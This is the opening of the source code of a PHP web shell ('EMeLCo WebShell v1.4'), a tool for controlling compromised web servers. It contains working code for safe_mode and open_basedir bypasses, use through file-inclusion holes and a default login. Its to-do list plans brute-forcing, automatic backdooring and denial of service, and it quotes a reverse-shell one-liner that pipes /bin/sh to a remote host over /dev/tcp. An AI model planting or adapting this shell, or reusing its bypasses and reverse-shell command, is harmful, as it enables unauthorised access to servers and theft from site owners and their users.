<?php
/*
                   ::::::::::   :::   :::   :::::::::: :::        ::::::::   :::::::: 
                  :+:         :+:+: :+:+:  :+:        :+:       :+:    :+: :+:    :+: 
                 +:+        +:+ +:+:+ +:+ +:+        +:+       +:+        +:+    +:+  
                +#++:++#   +#+  +:+  +#+ +#++:++#   +#+       +#+        +#+    +:+   
               +#+        +#+       +#+ +#+        +#+       +#+        +#+    +#+    
              #+#        #+#       #+# #+#        #+#       #+#    #+# #+#    #+#     
             ########## ###       ### ########## ########## ########   ########       
         :::       ::: :::::::::: :::::::::   ::::::::  :::    ::: :::::::::: :::        :::  
        :+:       :+: :+:        :+:    :+: :+:    :+: :+:    :+: :+:        :+:        :+:   
       +:+       +:+ +:+        +:+    +:+ +:+        +:+    +:+ +:+        +:+        +:+    
      +#+  +:+  +#+ +#++:++#   +#++:++#+  +#++:++#++ +#++:++#++ +#++:++#   +#+        +#+     
     +#+ +#+#+ +#+ +#+        +#+    +#+        +#+ +#+    +#+ +#+        +#+        +#+      
     #+#+# #+#+#  #+#        #+#    #+# #+#    #+# #+#    #+# #+#        #+#        #+#       
     ###   ###   ########## #########   ########  ###    ### ########## ########## ########## 

  EMelCo PHP WebShell v1.4
  Escrita por >> s E t H <<
  xd (dot) seth (at) gmail (dot) com
  http://code.google.com/p/emelco/
  http://emelco.66ghz.com/lists/
  
  http://elrincondeseth.wordpress.com/
  http://xd-blog.com.ar/
  http://foro.undersecurity.net/
  http://0verl0ad.blogspot.com/
  
  
  Copyright (c) 2009 2010 2011, EMeLCo
  All rights reserved.
 
  Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
 
      * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
      * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
      * Neither the name of the authors nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
  Gracielas: The X-C3LL, undersecurity.net, Zerial, S[e]C, ksha, Protos, famfamfam.com, Moon of Paper, tty0
  
  Changelog:
  1.4
    [!] El usuario por defecto es "by seth"
    [+] El css se muestra como un archivo separado para que quede en cache y cargue mas rapido
    [!] Arreglados un par de bugs al leer archivos
    [!] Arreglado un bug en el formulario para hacer chmod
    [!] Si la version de php no esta afectada por el bug, no se muestra el checkbox para el exploit de ini_restore
    [+] Funcion para borrarse a si misma
    [-] w=creditos no está mas
    [!] Cambió el icono para ejecutar comandos dentro de una carpeta
    [+] Funcion para empaquetar y descargar directorios
    [+] Bypass safe mode http://securityreason.com/achievement_securityalert/37

  1.3.1
    [!] Modificado un bug que hacia que no se guarde la cookie con el estado del div lateral si no se ve el div de abajo
    [!] Cambié un par de comillas dobles que quedaban
    
  To do:
    [!] Eliminar los mensajes de: "No se puede leer /var/log/messages porque supera los 50000 bytes", o ponerlos como link
    [+] Agregar rootexploits
    [+] Agregar exploits de php
    [+] Agregar backdoorizacion automática
    [+] Agregar descripciones en los textarea e input--> onfocus="this.value=''; this.onfocus=null;"
    [!] Mejorar las funciones para leer y escribir archivos
    [+] Agregar brute force de ssh
    [+] Agregar brute force de ftp
    [+] Agregar brute force de mysql
    [+] Agregar navegador de sql
    [+] Enviar muchos emails de un saque
    [+] DoS ?
    [+] Poner todas las imágenes en un solo archivo y mostrarlas con css para ahorrar peticiones
    [+] Usar ajax
    [+] Agregar comandos de la WSO, r57 y las variaciones de c99
    [+] Poner el css como las imagenes, en una peticion aparte y poner una version oscura
    [+] Agregar un reverse dns como el de US dentro de la shell
    [+] Comprimir directorios con ZipArchive
    [+] Reverse shell: exec /bin/sh 0</dev/tcp/hostname/port 1>&0 2>&0 http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
*/

//Usuario (Dejalo vacio para que no pida clave):
$nombre_usuario = 'by seth';
//hash sha1 de la clave
$clave_usuario = 'a0f1ba7debe4a2049b0f84d7dd95009a812f0b1a'; //"EMeLCo"

//Cambia esto para usar la shell con LFI
//$rfiurl = "?page=../../../error_log&";
$rfiurl = false;

error_reporting(0); //final
//error_reporting(E_ALL); //desarrollo

/**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/ /**/

// http://securityreason.com/achievement_securityalert/42
if(strtolower(ini_get('safe_mode'))=='on'){
    ini_restore('safe_mode');
}
if($_COOKIE['openBasedirBypass']=='true'){
    ini_restore('open_basedir');
}

set_time_limit(0);
ini_set('memory_limit', -1);

$nombre = 'EMeLCo WebShell v1.4';

// de php.net para contrarrestar magic_quotes_gpc
if (get_magic_quotes_gpc()) {
    function stripslashes_deep($value)
    {
        $value = is_array($value) ?
                    array_map('stripslashes_deep', $value) :
                    stripslashes($value);
        
        return $value;
    }

    $_POST = array_map('stripslashes_deep', $_POST);
    $_GET = array_map('stripslashes_deep', $_GET);
    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
}

//Parcheamos la url para que ande con RFI
if (!$rfiurl){
    $rfiurl = '?';
    $include = '&';
    foreach (explode('&',getenv('QUERY_STRING')) as $v) {
        $v = explode('=',$v);
        $name = urldecode($v[0]);
        $value = urldecode($v[1]);
        foreach (array('http://','https://','ssl://','ftp://','\\') as $needle) { 
            if (strpos($value,$needle) === 0) {
                $rfiurl .= urlencode($name).'='.urlencode($value).'&';}
        }
    }  
    unset($v);
    unset($name);
    unset($value);
}
$rfiurl = htmlentities($rfiurl);

//si tiene clave
if (isset($nombre_usuario) and ($nombre_usuario != '')){ 
    if ( ($_COOKIE['u'] != $nombre_usuario) or ($_COOKIE['c'] != $clave_usuario) ){ //si no está logueado muestra un formulario que pide la clave
        echo'
            <html><head><script>
                function createCookie(name,value,days) {
                    if (days) {
                        var date = new Date();
                        date.setTime(date.getTime()+(days*24*60*60*1000));
                        var expires = "; expires="+date.toGMTString();
                    }
                    else var expires = "";
                    document.cookie = name+"="+value+expires+"; path=/";
                }                    
                function saveIt() {
                    var x = document.forms["f"].u.value;
                    createCookie("u",x,7);
                    var x = document.forms["f"].c.value;
                    createCookie("c",sha1(x),7);
                    document.reload();
                }
                '.base64_decode('ZnVuY3Rpb24gdXRmOF9lbmNvZGUgKCBhcmdTdHJpbmcgKSB7DQogICAgLy8gaHR0cDovL2tldmluLnZhbnpvbm5ldmVsZC5uZXQNCiAgICAvLyArICAgb3JpZ2luYWwgYnk6IFdlYnRvb2xraXQuaW5mbyAoaHR0cDovL3d3dy53ZWJ0b29sa2l0LmluZm8vKQ0KICAgIC8vICsgICBpbXByb3ZlZCBieTogS2V2aW4gdmFuIFpvbm5ldmVsZCAoaHR0cDovL2tldmluLnZhbnpvbm5ldmVsZC5uZXQpDQogICAgLy8gKyAgIGltcHJvdmVkIGJ5OiBzb3diZXJyeQ0KICAgIC8vICsgICAgdHdlYWtlZCBieTogSmFjaw0KICAgIC8vICsgICBidWdmaXhlZCBieTogT25ubyBNYXJzbWFuDQogICAgLy8gKyAgIGltcHJvdmVkIGJ5OiBZdmVzIFN1Y2FldA0KICAgIC8vICsgICBidWdmaXhlZCBieTogT25ubyBNYXJzbWFuDQogICAgLy8gKyAgIGJ1Z2ZpeGVkIGJ5OiBVbHJpY2gNCiAgICAvLyAqICAgICBleGFtcGxlIDE6IHV0ZjhfZW5jb2RlKCdLZXZpbiB2YW4gWm9ubmV2ZWxkJyk7DQogICAgLy8gKiAgICAgcmV0dXJucyAxOiAnS2V2aW4gdmFuIFpvbm5ldmVsZCcNCiANCiAgICB2YXIgc3RyaW5nID0gKGFyZ1N0cmluZysnJyk7IC8vIC5yZXBsYWNlKC9cclxuL2csICJcbiIpLnJlcGxhY2UoL1xyL2csICJcbiIpOw0KIA0KICAgIHZhciB1dGZ0ZXh0ID0gIiI7DQogICAgdmFyIHN0YXJ0LCBlbmQ7DQogICAgdmFyIHN0cmluZ2wgPSAwOw0KIA0KICAgIHN0YXJ0ID0gZW5kID0gMDsNCiAgICBzdHJpbmdsID0gc3RyaW5nLmxlbmd0aDsNCiAgICBmb3IgKHZhciBuID0gMDsgbiA8IHN0cmluZ2w7IG4rKykgew0KICAgICAgICB2YXIgYzEgPSBzdHJpbmcuY2hhckNvZGVBdChuKTsNCiAgICAgICAgdmFyIGVuYyA9IG51bGw7DQogDQogICAgICAgIGlmIChjMSA8IDEyOCkgew0KICAgICAgICAgICAgZW5kKys7DQogICAgICAgIH0gZWxzZSBpZiAoYzEgPiAxMjcgJiYgYzEgPCAyMDQ4KSB7DQogICAgICAgICAgICBlbmMgPSBTdHJpbmcuZnJvbUNoYXJDb2RlKChjMSA+PiA2KSB8IDE5MikgKyBTdHJpbmcuZnJvbUNoYXJDb2RlKChjMSAmIDYzKSB8IDEyOCk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBlbmMgPSBTdHJpbmcuZnJvbUNoYXJDb2RlKChjMSA+PiAxMikgfCAyMjQpICsgU3RyaW5nLmZyb21DaGFyQ29kZSgoKGMxID4+IDYpICYgNjMpIHwgMTI4KSArIFN0cmluZy5mcm9tQ2hhckNvZGUoKGMxICYgNjMpIHwgMTI4KTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoZW5jICE9PSBudWxsKSB7DQogICAgICAgICAgICBpZiAoZW5kID4gc3RhcnQpIHsNCiAgICAgICAgICAgICAgICB1dGZ0ZXh0ICs9IHN0cmluZy5zdWJzdHJpbmcoc3RhcnQsIGVuZCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICB1dGZ0ZXh0ICs9IGVuYzsNCiAgICAgICAgICAgIHN0YXJ0ID0gZW5kID0gbisxOw0KICAgICAgICB9DQogICAgfQ0KIA0KICAgIGlmIChlbmQgPiBzdGFydCkgew0KICAgICAgICB1dGZ0ZXh0ICs9IHN0cmluZy5zdWJzdHJpbmcoc3RhcnQsIHN0cmluZy5sZW5ndGgpOw0KICAgIH0NCiANCiAgICByZXR1cm4gdXRmdGV4dDsNCn0=').base64_decode('ZnVuY3Rpb24gc2hhMSAoc3RyKSB7DQoNCiAgICAvLyBodHRwOi8va2V2aW4udmFuem9ubmV2ZWxkLm5ldA0KDQogICAgLy8gKyAgIG9yaWdpbmFsIGJ5OiBXZWJ0b29sa2l0LmluZm8gKGh0dHA6Ly93d3cud2VidG9vbGtpdC5pbmZvLykNCg0KICAgIC8vICsgbmFtZXNwYWNlZCBieTogTWljaGFlbCBXaGl0ZSAoaHR0cDovL2dldHNwcmluay5jb20pDQoNCiAgICAvLyArICAgICAgaW5wdXQgYnk6IEJyZXR0IFphbWlyIChodHRwOi8vYnJldHQtemFtaXIubWUpDQoNCiAgICAvLyArICAgaW1wcm92ZWQgYnk6IEtldmluIHZhbiBab25uZXZlbGQgKGh0dHA6Ly9rZXZpbi52YW56b25uZXZlbGQubmV0KQ0KDQogICAgLy8gLSAgICBkZXBlbmRzIG9uOiB1dGY4X2VuY29kZQ0KDQogICAgLy8gKiAgICAgZXhhbXBsZSAxOiBzaGExKCdLZXZpbiB2YW4gWm9ubmV2ZWxkJyk7DQoNCiAgICAvLyAqICAgICByZXR1cm5zIDE6ICc1NDkxNmQyZTYyZjY1YjNhZmE2ZTE5MmU2YTYwMWNkYmU1Y2I1ODk3Jw0KDQogDQoNCiAgICB2YXIgcm90YXRlX2xlZnQgPSBmdW5jdGlvbiAobixzKSB7DQoNCiAgICAgICAgdmFyIHQ0ID0gKCBuPDxzICkgfCAobj4+PigzMi1zKSk7DQoNCiAgICAgICAgcmV0dXJuIHQ0Ow0KDQogICAgfTsNCg0KIA0KDQogICAgLyp2YXIgbHNiX2hleCA9IGZ1bmN0aW9uICh2YWwpIHsgLy8gTm90IGluIHVzZTsgbmVlZGVkPw0KDQogICAgICAgIHZhciBzdHI9IiI7DQoNCiAgICAgICAgdmFyIGk7DQoNCiAgICAgICAgdmFyIHZoOw0KDQogICAgICAgIHZhciB2bDsNCg0KIA0KDQogICAgICAgIGZvciAoIGk9MDsgaTw9NjsgaSs9MiApIHsNCg0KICAgICAgICAgICAgdmggPSAodmFsPj4+KGkqNCs0KSkmMHgwZjsNCg0KICAgICAgICAgICAgdmwgPSAodmFsPj4+KGkqNCkpJjB4MGY7DQoNCiAgICAgICAgICAgIHN0ciArPSB2aC50b1N0cmluZygxNikgKyB2bC50b1N0cmluZygxNik7DQoNCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiBzdHI7DQoNCiAgICB9OyovDQoNCiANCg0KICAgIHZhciBjdnRfaGV4ID0gZnVuY3Rpb24gKHZhbCkgew0KDQogICAgICAgIHZhciBzdHI9IiI7DQoNCiAgICAgICAgdmFyIGk7DQoNCiAgICAgICAgdmFyIHY7DQoNCiANCg0KICAgICAgICBmb3IgKGk9NzsgaT49MDsgaS0tKSB7DQoNCiAgICAgICAgICAgIHYgPSAodmFsPj4+KGkqNCkpJjB4MGY7DQoNCiAgICAgICAgICAgIHN0ciArPSB2LnRvU3RyaW5nKDE2KTsNCg0KICAgICAgICB9DQoNCiAgICAgICAgcmV0dXJuIHN0cjsNCg0KICAgIH07DQoNCiANCg0KICAgIHZhciBibG9ja3N0YXJ0Ow0KDQogICAgdmFyIGksIGo7DQoNCiAgICB2YXIgVyA9IG5ldyBBcnJheSg4MCk7DQoNCiAgICB2YXIgSDAgPSAweDY3NDUyMzAxOw0KDQogICAgdmFyIEgxID0gMHhFRkNEQUI4OTsNCg0KICAgIHZhciBIMiA9IDB4OThCQURDRkU7DQoNCiAgICB2YXIgSDMgPSAweDEwMzI1NDc2Ow0KDQogICAgdmFyIEg0ID0gMHhDM0QyRTFGMDsNCg0KICAgIHZhciBBLCBCLCBDLCBELCBFOw0KDQogICAgdmFyIHRlbXA7DQoNCiANCg0KICAgIHN0ciA9IHRoaXMudXRmOF9lbmNvZGUoc3RyKTsNCg0KICAgIHZhciBzdHJfbGVuID0gc3RyLmxlbmd0aDsNCg0KIA0KDQogICAgdmFyIHdvcmRfYXJyYXkgPSBbXTsNCg0KICAgIGZvciAoaT0wOyBpPHN0cl9sZW4tMzsgaSs9NCkgew0KDQogICAgICAgIGogPSBzdHIuY2hhckNvZGVBdChpKTw8MjQgfCBzdHIuY2hhckNvZGVBdChpKzEpPDwxNiB8DQoNCiAgICAgICAgc3RyLmNoYXJDb2RlQXQoaSsyKTw8OCB8IHN0ci5jaGFyQ29kZUF0KGkrMyk7DQoNCiAgICAgICAgd29yZF9hcnJheS5wdXNoKCBqICk7DQoNCiAgICB9DQoNCiANCg0KICAgIHN3aXRjaCAoc3RyX2xlbiAlIDQpIHsNCg0KICAgICAgICBjYXNlIDA6DQoNCiAgICAgICAgICAgIGkgPSAweDA4MDAwMDAwMDsNCg0KICAgICAgICBicmVhazsNCg0KICAgICAgICBjYXNlIDE6DQoNCiAgICAgICAgICAgIGkgPSBzdHIuY2hhckNvZGVBdChzdHJfbGVuLTEpPDwyNCB8IDB4MDgwMDAwMDsNCg0KICAgICAgICBicmVhazsNCg0KICAgICAgICBjYXNlIDI6DQoNCiAgICAgICAgICAgIGkgPSBzdHIuY2hhckNvZGVBdChzdHJfbGVuLTIpPDwyNCB8IHN0ci5jaGFyQ29kZUF0KHN0cl9sZW4tMSk8PDE2IHwgMHgwODAwMDsNCg0KICAgICAgICBicmVhazsNCg0KICAgICAgICBjYXNlIDM6DQoNCiAgICAgICAgICAgIGkgPSBzdHIuY2hhckNvZGVBdChzdHJfbGVuLTMpPDwyNCB8IHN0ci5jaGFyQ29kZUF0KHN0cl9sZW4tMik8PDE2IHwgc3RyLmNoYXJDb2RlQXQoc3RyX2xlbi0xKTw8OCAgICB8IDB4ODA7DQoNCiAgICAgICAgYnJlYWs7DQoNCiAgICB9DQoNCiANCg0KICAgIHdvcmRfYXJyYXkucHVzaCggaSApOw0KDQogDQoNCiAgICB3aGlsZSAoKHdvcmRfYXJyYXkubGVuZ3RoICUgMTYpICE9IDE0ICkge3dvcmRfYXJyYXkucHVzaCggMCApO30NCg0KIA0KDQogICAgd29yZF9hcnJheS5wdXNoKCBzdHJfbGVuPj4+MjkgKTsNCg0KICAgIHdvcmRfYXJyYXkucHVzaCggKHN0cl9sZW48PDMpJjB4MGZmZmZmZmZmICk7DQoNCiANCg0KICAgIGZvciAoIGJsb2Nrc3RhcnQ9MDsgYmxvY2tzdGFydDx3b3JkX2FycmF5Lmxlbmd0aDsgYmxvY2tzdGFydCs9MTYgKSB7DQoNCiAgICAgICAgZm9yIChpPTA7IGk8MTY7IGkrKykge1dbaV0gPSB3b3JkX2FycmF5W2Jsb2Nrc3RhcnQraV07fQ0KDQogICAgICAgIGZvciAoaT0xNjsgaTw9Nzk7IGkrKykge1dbaV0gPSByb3RhdGVfbGVmdChXW2ktM10gXiBXW2ktOF0gXiBXW2ktMTRdIF4gV1tpLTE2XSwgMSk7fQ0KDQogDQoNCiANCg0KICAgICAgICBBID0gSDA7DQoNCiAgICAgICAgQiA9IEgxOw0KDQogICAgICAgIEMgPSBIMjsNCg0KICAgICAgICBEID0gSDM7DQoNCiAgICAgICAgRSA9IEg0Ow0KDQogDQoNCiAgICAgICAgZm9yIChpPSAwOyBpPD0xOTsgaSsrKSB7DQoNCiAgICAgICAgICAgIHRlbXAgPSAocm90YXRlX2xlZnQoQSw1KSArICgoQiZDKSB8ICh+QiZEKSkgKyBFICsgV1tpXSArIDB4NUE4Mjc5OTkpICYgMHgwZmZmZmZmZmY7DQoNCiAgICAgICAgICAgIEUgPSBEOw0KDQogICAgICAgICAgICBEID0gQzsNCg0KICAgICAgICAgICAgQyA9IHJvdGF0ZV9sZWZ0KEIsMzApOw0KDQogICAgICAgICAgICBCID0gQTsNCg0KICAgICAgICAgICAgQSA9IHRlbXA7DQoNCiAgICAgICAgfQ0KDQogDQoNCiAgICAgICAgZm9yIChpPTIwOyBpPD0zOTsgaSsrKSB7DQoNCiAgICAgICAgICAgIHRlbXAgPSAocm90YXRlX2xlZnQoQSw1KSArIChCIF4gQyBeIEQpICsgRSArIFdbaV0gKyAweDZFRDlFQkExKSAmIDB4MGZmZmZmZmZmOw0KDQogICAgICAgICAgICBFID0gRDsNCg0KICAgICAgICAgICAgRCA9IEM7DQoNCiAgICAgICAgICAgIEMgPSByb3RhdGVfbGVmdChCLDMwKTsNCg0KICAgICAgICAgICAgQiA9IEE7DQoNCiAgICAgICAgICAgIEEgPSB0ZW1wOw0KDQogICAgICAgIH0NCg0KIA0KDQogICAgICAgIGZvciAoaT00MDsgaTw9NTk7IGkrKykgew0KDQogICAgICAgICAgICB0ZW1wID0gKHJvdGF0ZV9sZWZ0KEEsNSkgKyAoKEImQykgfCAoQiZEKSB8IChDJkQpKSArIEUgKyBXW2ldICsgMHg4RjFCQkNEQykgJiAweDBmZmZmZmZmZjsNCg0KICAgICAgICAgICAgRSA9IEQ7DQoNCiAgICAgICAgICAgIEQgPSBDOw0KDQogICAgICAgICAgICBDID0gcm90YXRlX2xlZnQoQiwzMCk7DQoNCiAgICAgICAgICAgIEIgPSBBOw0KDQogICAgICAgICAgICBBID0gdGVtcDsNCg0KICAgICAgICB9DQoNCiANCg0KICAgICAgICBmb3IgKGk9NjA7IGk8PTc5OyBpKyspIHsNCg0KICAgICAgICAgICAgdGVtcCA9IChyb3RhdGVfbGVmdChBLDUpICsgKEIgXiBDIF4gRCkgKyBFICsgV1tpXSArIDB4Q0E2MkMxRDYpICYgMHgwZmZmZmZmZmY7DQoNCiAgICAgICAgICAgIEUgPSBEOw0KDQogICAgICAgICAgICBEID0gQzsNCg0KICAgICAgICAgICAgQyA9IHJvdGF0ZV9sZWZ0KEIsMzApOw0KDQogICAgICAgICAgICBCID0gQTsNCg0KICAgICAgICAgICAgQSA9IHRlbXA7DQoNCiAgICAgICAgfQ0KDQogDQoNCiAgICAgICAgSDAgPSAoSDAgKyBBKSAmIDB4MGZmZmZmZmZmOw0KDQogICAgICAgIEgxID0gKEgxICsgQikgJiAweDBmZmZmZmZmZjsNCg0KICAgICAgICBIMiA9IChIMiArIEMpICYgMHgwZmZmZmZmZmY7DQoNCiAgICAgICAgSDMgPSAoSDMgKyBEKSAmIDB4MGZmZmZmZmZmOw0KDQogICAgICAgIEg0ID0gKEg0ICsgRSkgJiAweDBmZmZmZmZmZjsNCg0KICAgIH0NCg0KIA0KDQogICAgdGVtcCA9IGN2dF9oZXgoSDApICsgY3Z0X2hleChIMSkgKyBjdnRfaGV4KEgyKSArIGN2dF9oZXgoSDMpICsgY3Z0X2hleChINCk7DQoNCiAgICByZXR1cm4gdGVtcC50b0xvd2VyQ2FzZSgpOw0KDQp9').'
            </script></head><body>';
                if($clave_usuario == 'a0f1ba7debe4a2049b0f84d7dd95009a812f0b1a'){
                    echo '<div style="font-weight: bold; color: #CD2626;">&iexcl;ATENCI&Oacute;N, no se cambi&oacute; la clave por defecto!</div><br>';
                }                
            echo '<form name="f" action="'.$rfiurl.'" method="POST">
                Usuario: <input name="u" type="text"><br>Clave: <input name="c" type="password"><br><input type="submit" value="Entrar" onclick="saveIt()">
            </form></body></html>
        ';
        die();
    }
}

// Con esto mostramos las imagenes. Va arriba porque no se puede mandar nada antes
if ($_GET['w']=='img'){
    Header('Content-type: image/gif');
    if($_GET['imagen']=='carpeta'){
        die(base64_decode('R0lGODlhEAAQAMQfAOvGUf7ztuvPMf/78/fkl/Pbg+u8Rvjqteu2Pf3zxPz36Pz0z+vTmPzurPvuw/npofbjquvNefHVduuyN+uuMu3Oafbgjfnqvf/3zv/3xevPi+vRjP/20/bmsP///////yH5BAEAAB8ALAAAAAAQABAAAAV24CeOZGmepqeqqOgxjBZFa+19r4ftWQUAgqDgltthMshMIJAZ4jYDHsBARSAmFOJvq+g6HIdEFgcYmBWNxoNAsDjGHgBnmV5bCoUDHLBIq9sFEhIdcAYJdYASFRUQhQkLCwkOFwcdEBAXhVabE52ecDahKy0oIQA7'));
    }elseif($_GET['imagen']=='ejecutable'){
        die(base64_decode('R0lGODlhEAAQAMQfAESUKF/CPoXZVn3VUihXGGXGQU6qL/b79HHNSdTvyy9nHD6HJnfRTYDWVI7eXIrcWonbWXrTT0mhLGnJRG3LRyVPFnTPSzZ0Ib3mr460gLLiocXpuCNMFez46P///////yH5BAEAAB8ALAAAAAAQABAAAAWJ4Pd5ZGl6ougZbCtJALCgo5EdXa53h3ahq4PD8YAIGoMII6EAGjpEoyDJsGwIzk5R4GkoLYgrUNKRkqoIyqYy7giOpfRkDVx0kBESZVIoaDh1HVQeCBN8AX9AFx1faX0BiIAjCgdoewWQARiSHgoZCRuhGxqkGBmSIwQVqxytrqgqJycptLW2HyEAOw=='));
    }elseif($_GET['imagen']=='enlace'){
        die(base64_decode('R0lGODlhEAAQANUkAHBwcMXFxaioqJqamtHR0XNzc6SkpJeXl6CgoNXV1ZiYmHd3d8fHx6Kioo2NjZubm6GhoX9/f4qKipSUlKenp5CQkJOTk6Ojo3t7e6WlpZ2dnX19fZ+fn4SEhHJycn5+foWFhZ6entra2v///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACQALAAAAAAQABAAAAZmQJJwSCwaj0jSaMlMjgSUjAGCGB2fI1GCwAg8rEKmYGRAcAYKRWDCHIXe78vyAH8vRXg8SBjJ45cggYEDSwUAh4dtDSMHFRIdHxgBC01hGllbXR5gRSMWDiAbCwWcRm1LSamqq6pBADs='));
    }elseif($_GET['imagen']=='flechad'){
        die(base64_decode('R0lGODlhEAAQALMLAJLNXpDEaZPNX4/NU5bUWJnXWpDNVIvFWXyuWmOPRf///////wAAAAAAAAAAAAAAACH5BAEAAAsALAAAAAAQABAAAAQvcMlJq704Z6U0VUm3cWC4JWgCmBc4GESxihUIAIGAsHWaHLwaCUU7FUeepHJpiQAAOw=='));
    }elseif($_GET['imagen']=='archivo'){
        die(base64_decode('R0lGODlhEAAQAMQfAMfj/uzx9rvc/eXt9YivyHaXtFdwkZXK/KvU+0lVa/L2+rba/KTR+4m77FJhe67T5UNLXNXn8MDf/bHX/JrA1qjL3t7n7ykxQz5FVeLp8LDR48vM0Z7O+9Xb5P///////yH5BAEAAB8ALAAAAAAQABAAAAWPoCeO5PidXvRoFUURRCEXHvpEQ5DrQ98YNY9mACgWJUhF4yeqKIwApECgqDpElOdRulhMFFdPdisRdCcIsIjwlJon6HRireB6EQgGYzD3FAJccXocAxAif1N3eQwcHBmGfgFmd4MHBxYYhwpveIwclgGZHgYdCjwZqBkWARsXhwawDg4JCRAQGBgXYSW8JCEAOw=='));
    }elseif($_GET['imagen']=='descargar'){
        die(base64_decode('R0lGODlhEAAQAMQfAJLNW3aXtJrM++vx9+Xt9YivyKTR+8fj/ldwkUlVa73e/dXb5PH1+mGNRPDx8bPY/Im77H6xW1Jhe7TR4ENLXNXn8PX4+vv7+5rA1qjL3uDo7ykxQz5FVWOPRf///////yH5BAEAAB8ALAAAAAAQABAAAAWWoCeO5PidXjVNGYYVRSAHHjpVxJDrRA8hNc+EcCgWFUgG5CfKWIydaEfBqEpEmGexA4h0HmDG1ZOFdr/hcYFxkAIAUgMjIVorLtw3oHExEOgeAQNJHRERDQ4GfhQigkgPDg2IBgICGoyBg2CQiZWWHI0WCpuKlJUOoB4ICww8BBqwGg4TG40ItxISCQkUFBwcG2MlwyQhADs='));
    }elseif($_GET['imagen']=='editar'){
        die(base64_decode('R0lGODlhEAAQAMQAAGB3lYivyMDf/XiZt+Ts9ajT/Mbh/UlVa/P2+bLY/FRlfu3x9ZzN++Xy/rTR4ENLXN7v/tTk8Jm/1enx96jL3uDo7ykxQz5FVb2JAP+8Bv/RV6HQ/FSr9qfR+jhllf///yH5BAAAAAAALAAAAAAQABAAAAWV4CeOZClGjkNJUhAMsOdJohMRUz4RvNdxntrEQCQKGj6gQkRBFAXHpAex/EicBijy54FQRddslAspfD8BhBZDLpgPovQRo8l0C50NAf4ZLBp0GRhleXoPIn4RdYN4GxsMFYd9CwkKlgoAAwybFReICAkJeAUDAKYAC54fABEIOzwEFbILDhaImJcHBw8PFxcWVSbCIiEAOw=='));
    }elseif($_GET['imagen']=='eliminar'){
        die(base64_decode('R0lGODlhEAAQAMQfAPMyMpfL/HSUseYTE/5WVrzd/e3x9eXs9VdwkarU+0pXbbba/ISqxaLQ+/74+MLg/Ym77PD1+v+IiNrf51Jhe0RNX/729rHX/CkxQz9GVsvM0f7IyNRBRuDo8P///////yH5BAEAAB8ALAAAAAAQABAAAAWSoOdYnlie5ac63OBt3MTMQu2p5TAQXhQdwAMEcSsRBoDSY1mIQIYigIsg8TCbPorHMqieHoXCYnGJaL9LsJicMJcYkfT6ckm0Fe84eFy3Nw54HgwGamwJDYgHFSUCBmGGiA0BHYsejXN+kpMZjBFifYgBogacHggTEQZBHawdBhoYjAizFBQKChUVGRkYZyi/wCEAOw=='));
    }elseif($_GET['imagen']=='comandos'){
        die(base64_decode('iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGNSURBVDjLpVM9SwNBEJ297J1FQBtzjQj2dgppYiP4A1KZRoiFrYWt9rHyH6QUPBDTCimtLNSAnSB26YKg4EdMdsd5611cjwsIWRhmZ3f2zZuPVcxMsyx9fPF0NRfS2vM7lx2WtcQiJHvDRvZMluXMGNHstJH7+Wj09jHkOy1+tc3VxeC+P6TXT1sYZX2hT7cvS6lepv3zHUp2T8vXNw81dXT2yGwEGeERSbSVCC5qysYa+3vm9sJGmLFojceXJ9uklCqUIAic5G3IytahAAhqqVSiwWDwx6nogW9XKhWphaGAvC50Oh1qtVr/7oAdCwBQwjB00mg0qFqtUr1ed3YURZM7X7TWTqM2Gm3CASRJEur1etTtdp1DnrafFtJGMbVNGSBas9l0DrAzR6x8DdwASUB0RqNNGS2/gH7EInvCwMhkZTnlnX0GsP09tJER0BgMoAEAa1rETDIQvBkjBZeHMIjjuNB5Ggg0/oZWPGrHGwd7Fp9F2CAlgHKqf0aYXb6Y2mzE8d/IfrXVrN/5G81p6oa2mIEUAAAAAElFTkSuQmCC'));
    }elseif($_GET['imagen']=='archivonuevo'){
